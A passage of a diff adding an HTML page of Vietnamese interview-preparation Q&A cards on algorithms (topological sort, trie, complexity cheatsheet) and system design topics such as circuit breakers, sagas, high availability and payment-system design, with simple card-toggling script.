+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Sắp xếp node của DAG sao cho mọi edge u→v thì u xuất hiện trước v. Chỉ áp dụng với graph <strong>không có cycle</strong>.</p>
+<pre><code class="language-python">from collections import deque
+
+def topo_sort(graph, in_degree):
+    queue = deque(n for n in graph if in_degree[n] == 0)
+    result = []
+    while queue:
+        node = queue.popleft(); result.append(node)
+        for nb in graph[node]:
+            in_degree[nb] -= 1
+            if in_degree[nb] == 0: queue.append(nb)
+    return result if len(result) == len(graph) else []  # [] = có cycle</code></pre>
+          <p>Ứng dụng: CI/CD pipeline task ordering, package dependency resolution, DB migration order.</p>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q18</span>
+          <span class="q-text">Trie (Prefix Tree) là gì? Khi nào dùng?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Trie lưu các string theo từng ký tự — prefix chung dùng chung node. Search/insert <strong>O(L)</strong> với L là độ dài string.</p>
+<pre><code class="language-python">class TrieNode:
+    def __init__(self): self.children = {}; self.is_end = False
+
+class Trie:
+    def __init__(self): self.root = TrieNode()
+
+    def insert(self, word):
+        node = self.root
+        for ch in word:
+            node = node.children.setdefault(ch, TrieNode())
+        node.is_end = True
+
+    def starts_with(self, prefix) -> bool:
+        node = self.root
+        for ch in prefix:
+            if ch not in node.children: return False
+            node = node.children[ch]
+        return True</code></pre>
+          <p>Ứng dụng: autocomplete, spell checker, IP routing table.</p>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q19</span>
+          <span class="q-text">Cheatsheet Time Complexity các operation phổ biến.</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <table>
+            <tr><th>Structure</th><th>Access</th><th>Search</th><th>Insert</th><th>Delete</th></tr>
+            <tr><td>Array</td><td>O(1)</td><td>O(n)</td><td>O(n)</td><td>O(n)</td></tr>
+            <tr><td>Linked List</td><td>O(n)</td><td>O(n)</td><td>O(1)</td><td>O(1)</td></tr>
+            <tr><td>Hash Table</td><td>—</td><td>O(1) avg</td><td>O(1) avg</td><td>O(1) avg</td></tr>
+            <tr><td>BST</td><td>O(log n)</td><td>O(log n)</td><td>O(log n)</td><td>O(log n)</td></tr>
+            <tr><td>Heap (get min)</td><td>O(1)</td><td>—</td><td>O(log n)</td><td>O(log n)</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q20</span>
+          <span class="q-text">Khi phỏng vấn coding, approach thế nào có hệ thống?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+<pre><code class="language-text">1. Clarify  (2 phút): hỏi edge case, input range, expected output
+2. Brute force (1 phút): nói approach O(n²) trước để có baseline
+3. Optimize (3 phút): tìm pattern (hash map? sort? sliding window? DP?)
+4. Code (10 phút): viết clean, tên biến rõ ràng
+5. Test (2 phút): trace qua ví dụ, check edge case (empty, single element)
+6. Complexity (1 phút): nói rõ O(?) time và O(?) space</code></pre>
+          <p>Với Tyme: tập trung Q11-Q15 (Two Sum, Valid Parentheses, Sliding Window, Linked List, Cycle Detection) — mức hay hỏi theo JD.</p>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ══════════════════════════════════════════
+       PROJECT & SYSTEM DESIGN
+  ══════════════════════════════════════════ -->
+  <section id="sec-proj" class="section proj">
+    <div class="section-header">
+      <div class="section-icon">🏗️</div>
+      <div>
+        <h2>Project & System Design</h2>
+        <p>Stack · Monolith vs Microservices · Circuit Breaker · Saga · HA · Observability</p>
+      </div>
+    </div>
+    <div class="progress-bar proj"><div class="progress-fill" style="width:100%"></div></div>
+    <div class="controls">
+      <button class="ctrl-btn" onclick="expandAll('sec-proj')">Mở tất cả</button>
+      <button class="ctrl-btn" onclick="collapseAll('sec-proj')">Đóng tất cả</button>
+      <span class="count-label">20 câu hỏi</span>
+    </div>
+    <div class="qa-list">
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q1</span>
+          <span class="q-text">Trình bày dự án hiện tại trong 2 phút như thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Cấu trúc: <strong>Context → Stack → Role → Challenge → Result</strong>.</p>
+<pre><code class="language-text">"Tôi đang làm [loại hệ thống] phục vụ [scale: X users / Y TPS].
+Backend dùng [Python FastAPI + Golang], DB là [PostgreSQL + Redis],
+chạy trên [AWS EKS].
+Tôi phụ trách [payment API domain] — từ thiết kế API contract đến deployment.
+Thách thức lớn nhất là [duplicate payment khi retry] —
+giải bằng [idempotency key + Redis lock],
+kết quả giảm duplicate rate từ [0.3%] xuống [gần 0]."</code></pre>
+          <p>Tip: chuẩn bị <strong>số liệu cụ thể</strong> (TPS, latency, uptime) — interviewer đánh giá cao engineer biết metric của hệ thống mình.</p>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q2</span>
+          <span class="q-text">Tại sao chọn tech stack hiện tại? Ưu nhược điểm?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Trả lời theo framework: <strong>Lý do chọn → Ưu thực tế đã thấy → Nhược đang deal → Sẽ chọn khác nếu làm lại</strong>.</p>
+          <p>Ví dụ FastAPI:</p>
+          <ul>
+            <li><strong>Chọn vì</strong>: async native, Pydantic validation, team quen Python.</li>
+            <li><strong>Ưu</strong>: tự sinh OpenAPI docs, DI gọn, test dễ.</li>
+            <li><strong>Nhược</strong>: GIL giới hạn CPU-bound, ecosystem nhỏ hơn Spring Boot.</li>
+            <li><strong>Làm lại</strong>: vẫn chọn FastAPI cho API layer, nhưng Golang cho high-throughput worker.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q3</span>
+          <span class="q-text">Monolith vs Microservices — khi nào dùng cái nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <table>
+            <tr><th></th><th>Monolith</th><th>Microservices</th></tr>
+            <tr><td>Team size</td><td>Nhỏ (&lt;10 engineer)</td><td>Lớn, nhiều team</td></tr>
+            <tr><td>Deploy</td><td>Đơn giản</td><td>Phức tạp (K8s, service mesh)</td></tr>
+            <tr><td>Latency</td><td>Thấp (in-process)</td><td>Cao hơn (network call)</td></tr>
+            <tr><td>Scale</td><td>Scale toàn bộ</td><td>Scale từng service riêng</td></tr>
+          </table>
+          <p><strong>Rule thực tế:</strong> Bắt đầu monolith → tách microservice khi có team riêng cho domain đó. "Premature microservices" là anti-pattern phổ biến.</p>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q4</span>
+          <span class="q-text">Circuit Breaker pattern là gì? Tại sao cần?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Khi service downstream liên tục fail, thay vì tiếp tục gọi và chờ timeout → Circuit Breaker "mở" circuit, trả về fallback ngay. Sau timeout, thử lại (half-open).</p>
+<pre><code class="language-text">CLOSED → (error rate > 50%) → OPEN → (timeout 30s) → HALF-OPEN
+                                                          ↓ success → CLOSED
+                                                          ↓ fail    → OPEN</code></pre>
+          <p>Lợi ích: tránh cascade failure, giảm load cho service đang lỗi, <strong>fast-fail</strong> thay vì chờ timeout.</p>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q5</span>
+          <span class="q-text">Saga Pattern là gì? Dùng khi nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Saga giải quyết distributed transaction trong microservices — thay thế 2PC (quá coupling).</p>
+          <ul>
+            <li><strong>Choreography</strong>: mỗi service publish event, service khác lắng nghe và phản ứng. Loose coupling nhưng khó debug.</li>
+            <li><strong>Orchestration</strong>: có orchestrator điều phối từng bước, gọi compensating transaction nếu fail.</li>
+          </ul>
+<pre><code class="language-text">Transfer Saga (Orchestration):
+1. Debit account A  → OK
+2. Credit account B → FAIL → compensate: refund A
+3. Send receipt     → chỉ chạy nếu bước 1+2 thành công</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q6</span>
+          <span class="q-text">Event-driven Architecture là gì? Ưu nhược điểm?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Services giao tiếp qua events (Kafka) thay vì gọi API trực tiếp. Producer publish event, consumer xử lý async.</p>
+          <p><strong>Ưu:</strong> loose coupling, dễ scale consumer, có thể replay event, fan-out dễ dàng.</p>
+          <p><strong>Nhược:</strong> eventual consistency, khó debug (cần distributed tracing), phải handle duplicate event (idempotent consumer).</p>
+<pre><code class="language-text">Payment Service → [Kafka: payment.completed] → Notification Service
+                                              → Ledger Service
+                                              → Fraud Detection Service</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q7</span>
+          <span class="q-text">Làm sao đảm bảo High Availability (HA)?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>HA = loại bỏ single point of failure + tự động recover.</p>
+          <ul>
+            <li><strong>Multiple instances</strong>: ít nhất 2 pod, load balancer phân phối traffic.</li>
+            <li><strong>Health check</strong>: liveness + readiness probe → K8s tự restart pod fail.</li>
+            <li><strong>Multi-AZ</strong>: deploy across nhiều Availability Zone — 1 AZ down, AZ khác vẫn chạy.</li>
+            <li><strong>DB failover</strong>: RDS Multi-AZ với auto-failover.</li>
+            <li><strong>Graceful shutdown</strong>: drain traffic trước khi kill pod.</li>
+          </ul>
+          <p>Target: <strong>99.9%</strong> = 8.7 giờ downtime/năm. <strong>99.99%</strong> = 52 phút/năm.</p>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q8</span>
+          <span class="q-text">Horizontal vs Vertical Scaling — khác nhau thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Vertical (Scale Up)</strong>: thêm CPU/RAM cho máy hiện tại. Đơn giản, không đổi code. Giới hạn bởi hardware max, có downtime khi nâng cấp.</li>
+            <li><strong>Horizontal (Scale Out)</strong>: thêm instance/node. Không giới hạn lý thuyết. Cần app <strong>stateless</strong>, cần load balancer, distributed session.</li>
+          </ul>
+          <p>Thứ tự thực tế: vertical scale trước (nhanh, đơn giản) → horizontal khi đụng trần vertical.</p>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q9</span>
+          <span class="q-text">Các chiến lược Load Balancing phổ biến?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <table>
+            <tr><th>Chiến lược</th><th>Cách hoạt động</th><th>Khi dùng</th></tr>
+            <tr><td>Round Robin</td><td>Luân phiên đều</td><td>Request đồng đều, stateless</td></tr>
+            <tr><td>Least Connections</td><td>Server ít connection nhất</td><td>Request có độ dài khác nhau</td></tr>
+            <tr><td>IP Hash</td><td>Hash IP → server cố định</td><td>Cần sticky session</td></tr>
+            <tr><td>Weighted</td><td>Server mạnh nhận nhiều hơn</td><td>Server không đồng đều</td></tr>
+          </table>
+          <p>AWS ALB dùng Least Outstanding Requests mặc định.</p>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q10</span>
+          <span class="q-text">Blue/Green vs Canary Deployment — khác nhau thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Blue/Green</strong>: chạy song song 2 môi trường, switch toàn bộ traffic khi test OK. Rollback instant. Tốn gấp đôi resource.</li>
+            <li><strong>Canary</strong>: route 5% traffic sang version mới trước, tăng dần lên 100%. Blast radius nhỏ. Phức tạp hơn.</li>
+          </ul>
+          <p>Với banking: <strong>Blue/Green</strong> an toàn hơn — không muốn production user nhận lỗi dù chỉ 5%.</p>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q11</span>
+          <span class="q-text">Ba trụ cột của Observability là gì?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Metrics</strong> (Prometheus + Grafana): số liệu aggregated — TPS, p99 latency, error rate, CPU. Alert khi vượt threshold.</li>
+            <li><strong>Logs</strong> (ELK): event có cấu trúc. Debug cụ thể khi có incident. Luôn log <code>request_id</code>.</li>
+            <li><strong>Traces</strong> (Jaeger, AWS X-Ray): theo dõi một request qua nhiều service. Tìm bottleneck trong distributed system.</li>
+          </ul>
+          <p>Ba cái bổ sung nhau: metric báo "có vấn đề", log cho biết "vấn đề là gì", trace chỉ "xảy ra ở đâu".</p>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q12</span>
+          <span class="q-text">API Versioning — các chiến lược?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <table>
+            <tr><th>Chiến lược</th><th>Ví dụ</th><th>Ưu/Nhược</th></tr>
+            <tr><td>URL Path</td><td><code>/api/v1/users</code></td><td>Rõ ràng, dễ test, cache tốt ✓</td></tr>
+            <tr><td>Header</td><td><code>API-Version: 2</code></td><td>URL gọn, khó cache, khó test</td></tr>
+            <tr><td>Query param</td><td><code>/users?version=2</code></td><td>Linh hoạt, dễ bỏ sót</td></tr>
+          </table>
+          <p>Tyme dùng <strong>URL path versioning</strong> — standard trong fintech vì rõ ràng và audit-friendly.</p>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q13</span>
+          <span class="q-text">Làm sao handle backward compatibility khi thay đổi API?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Additive changes</strong>: thêm field mới vào response → safe, client cũ bỏ qua.</li>
+            <li><strong>Breaking changes</strong>: xóa field, đổi type, đổi behavior → cần <code>/v2/</code>.</li>
+            <li><strong>Deprecation policy</strong>: giữ <code>/v1/</code> song song ít nhất 6 tháng, gửi <code>Deprecation</code> header.</li>
+          </ul>
+<pre><code class="language-python">class TransferResponseV2(TransferResponseV1):
+    fee: Decimal = Decimal("0")   # field mới có default → client cũ bỏ qua được</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q14</span>
+          <span class="q-text">Message Queue vs Direct API Call — khi nào dùng cái nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <table>
+            <tr><th></th><th>Direct API</th><th>Message Queue</th></tr>
+            <tr><td>Latency</td><td>Thấp (sync)</td><td>Cao hơn (async)</td></tr>
+            <tr><td>Coupling</td><td>Tight</td><td>Loose</td></tr>
+            <tr><td>Retry</td><td>Tự implement</td><td>Built-in</td></tr>
+            <tr><td>Backpressure</td><td>Không có</td><td>Queue làm buffer</td></tr>
+          </table>
+          <p>Ví dụ: <code>POST /transfer</code> → API call trực tiếp (cần kết quả ngay). Sau transfer thành công → publish Kafka event (notification, audit, analytics không cần response ngay).</p>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q15</span>
+          <span class="q-text">Design hệ thống chuyển tiền — các điểm quan trọng?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+<pre><code class="language-text">Client → API Gateway (auth, rate limit)
+       → Payment API
+           1. Idempotency check (Redis SET NX)
+           2. Check balance (SELECT FOR UPDATE)
+           3. Atomic debit/credit (DB transaction)
+           4. Record immutable ledger entries
+           5. Publish Kafka event: payment.completed
+              → Notification Service (async)
+              → Audit Service       (async)
+              → Fraud Service       (async, flag suspicious)</code></pre>
+          <p><strong>Điểm quan trọng phải nhắc:</strong> Idempotency key · Optimistic/Pessimistic lock · ACID transaction · Immutable ledger · Saga pattern nếu cross-service.</p>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q16</span>
+          <span class="q-text">Thách thức kỹ thuật lớn nhất trong dự án của anh?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Cấu trúc: <strong>Vấn đề → Tại sao khó → Approach đã thử → Giải pháp → Kết quả</strong>.</p>
+<pre><code class="language-text">Vấn đề: duplicate payment khi client retry do network timeout.
+Tại sao khó: distributed system, nhiều pod, không dùng được DB unique constraint
+đơn giản vì có race condition giữa check và insert.
+Thử: DB unique constraint → fail race condition.
+Giải pháp: Redis SET NX (atomic) acquire lock trước khi xử lý,
+lưu kết quả 24h. Retry nhận lại kết quả cũ.
+Kết quả: duplicate rate từ ~0.3% xuống 0.</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q17</span>
+          <span class="q-text">Làm sao deal với technical debt trong dự án?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Không phủ nhận</strong>: track trong backlog với label riêng.</li>
+            <li><strong>Boy Scout Rule</strong>: chỉ giải quyết khi đụng vào vùng code đó — leave it better than you found it.</li>
+            <li><strong>Tạo business case</strong>: đo impact cụ thể (deploy time +X%, bug rate +Y%) để thuyết phục PM.</li>
+            <li><strong>Strangler Fig Pattern</strong>: dần thay thế hệ thống cũ bằng hệ thống mới song song — không big bang rewrite.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q18</span>
+          <span class="q-text">Eventual Consistency có vấn đề gì với banking?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Eventual consistency: sau một thời gian, tất cả node sẽ thấy cùng giá trị — nhưng có độ trễ.</p>
+          <p><strong>Vấn đề với banking:</strong> User vừa chuyển tiền, check balance ngay từ read replica chưa sync → thấy balance sai → có thể dẫn đến overdraft.</p>
+          <p><strong>Giải pháp:</strong></p>
+          <ul>
+            <li>Balance check quan trọng → đọc từ <strong>primary</strong> (strong consistency).</li>
+            <li>Dùng <code>SELECT FOR UPDATE</code> đảm bảo đọc latest committed value.</li>
+            <li>Dùng <code>SERIALIZABLE</code> isolation level nếu cần.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q19</span>
+          <span class="q-text">Làm sao monitor và alert production hiệu quả?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p><strong>SLI/SLO/SLA framework:</strong></p>
+          <ul>
+            <li><strong>SLI</strong> (Indicator): metric đo được — "p99 latency của /transfer".</li>
+            <li><strong>SLO</strong> (Objective): mục tiêu — "p99 latency &lt; 500ms, 99.9% thời gian".</li>
+            <li><strong>SLA</strong> (Agreement): cam kết với khách hàng — penalty nếu vi phạm.</li>
+          </ul>
+          <p><strong>Alert nguyên tắc:</strong></p>
+          <ul>
+            <li>Alert trên <strong>symptom</strong> (error rate cao), không phải cause (CPU cao).</li>
+            <li>Mỗi alert phải <strong>actionable</strong> — có runbook. Alert không có action → alert fatigue.</li>
+            <li>PagerDuty chỉ cho critical — còn lại vào Slack.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="qa-card proj">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q20</span>
+          <span class="q-text">"Ownership rất cao" — Tyme hay nhắc. Điều đó có nghĩa gì?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>"Build it, Own it" — engineer không chỉ viết code mà chịu trách nhiệm <strong>toàn bộ vòng đời</strong>: thiết kế, implement, deploy, monitor, on-call, fix production bug.</p>
+          <p>Thực tế điều đó có nghĩa:</p>
+          <ul>
+            <li>Viết runbook và alert <strong>trước khi</strong> deploy feature mới.</li>
+            <li>Không throw code qua tường cho ops team.</li>
+            <li>Bị pager lúc 3am nếu service của mình down.</li>
+            <li>Chủ động đề xuất cải tiến thay vì chờ được assign.</li>
+          </ul>
+          <p>Ở vị trí lead: đảm bảo cả team hiểu domain, không trở thành single point of knowledge.</p>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+</main>
+
+<script>
+  hljs.highlightAll();
+
+  function toggle(questionEl) {
+    const card = questionEl.closest('.qa-card');
+    card.classList.toggle('open');
+  }
+
+  function expandAll(sectionId) {
+    document.querySelectorAll(`#${sectionId} .qa-card`).forEach(c => c.classList.add('open'));
+  }
+
+  function collapseAll(sectionId) {
+    document.querySelectorAll(`#${sectionId} .qa-card`).forEach(c => c.classList.remove('open'));
+  }
+
+  function showTopic(topic) {
+    // Hide all sections
+    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+    document.querySelectorAll('.topic-btn').forEach(b => b.classList.remove('active'));
+
+    // Show selected
+    document.getElementById(`sec-${topic}`).classList.add('active');
+    document.querySelector(`.topic-btn.${topic}`).classList.add('active');
+  }
+</script>
+</body>
+</html>
